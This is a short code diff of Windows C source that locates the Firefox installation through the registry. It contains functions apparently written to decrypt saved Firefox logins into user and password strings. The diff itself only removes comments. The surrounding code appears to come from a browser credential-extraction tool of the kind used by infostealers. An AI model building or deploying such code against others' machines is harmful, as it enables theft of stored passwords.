@@ -35,7 +35,6 @@ char *installPath(){
 	if (!SHGetValueA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Mozilla\\Mozilla Firefox", "CurrentVersion", 0, value, &cbSize)){
 		path = dupcat(path, "\\", value, "\\Main", 0);
 		strcpy(g_ver, value);
-		//printf("[+] Firefox version %s\n", g_ver);
 		cbSize = MAX_PATH;
 		if (!SHGetValueA(HKEY_LOCAL_MACHINE, path, "Install Directory", 0, value, &cbSize)){
 			int size = strlen(value) + 1;
@@ -230,8 +229,8 @@ VOID decrypt_firefox_json()
 int firefox_worker(LPVOID lpReserved, int dwColumns, LPSTR *strValues, LPSTR *strNames)
 {
 	LPSTR strResource = NULL;
-	LPSTR strUser = NULL; // (LPWSTR) talloc(1024*sizeof(WCHAR));
-	LPSTR strPass = NULL; // (LPWSTR) talloc(1024*sizeof(WCHAR));
+	LPSTR strUser = NULL; 
+	LPSTR strPass = NULL; 
 
 	for (DWORD i = 0; i < dwColumns; i++)
 	{
